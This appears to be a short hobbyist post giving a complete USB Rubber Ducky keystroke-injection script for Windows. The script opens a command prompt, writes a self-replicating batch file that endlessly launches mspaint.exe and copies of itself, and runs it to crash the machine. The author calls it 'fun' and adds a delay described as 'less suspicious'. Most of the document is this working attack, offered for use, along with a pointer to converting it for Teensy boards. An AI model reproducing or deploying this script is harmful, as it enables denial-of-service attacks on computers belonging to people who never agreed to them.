# About...
Version: 1.0

Author: BlueArduino20

# Fork Bomb for Rubber Ducky (For Windows)
Really basic script to crash Windows executing exponencially "mspaint.exe" and the same bat. It could be fun!

It's designed for the USB Rubber Ducky, but you can convert it for Teensy with Duckuino.js (By d4n5h): https://github.com/d4n5h/Duckuino

Anyway, here you've got the code:

# Code for Rubber Ducky

<pre><code>REM Fork Bomb for Windows. By: BlueArduino20
REM Let's give windows time to recognize our BadUSB
DELAY 2000
GUI r
ENTER
DELAY 100
STRING cmd
ENTER
DELAY 100
STRING copy con F.bat
ENTER
REM Some bat delay (Less suspicious)
STRING >nul ping 127.0.0.1 -n 10
ENTER
STRING :A
ENTER
STRING start mspaint.exe && start F.bat
ENTER
STRING GOTO A
ENTER
CONTROL z
ENTER
DELAY 100
STRING start F.bat</pre></code>
